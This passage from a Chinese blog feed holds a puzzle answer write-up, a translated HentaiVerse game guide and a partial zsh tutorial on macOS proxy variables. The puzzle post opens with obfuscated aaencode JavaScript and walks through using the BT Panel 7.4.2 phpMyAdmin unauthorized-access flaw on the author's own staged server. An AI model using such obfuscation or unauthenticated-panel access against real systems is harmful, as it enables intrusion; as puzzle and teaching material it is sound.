(ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div>[译] HentaiVerse 建议和指导</div>\n<div><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-24</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/1.png\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.3/2.png\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span 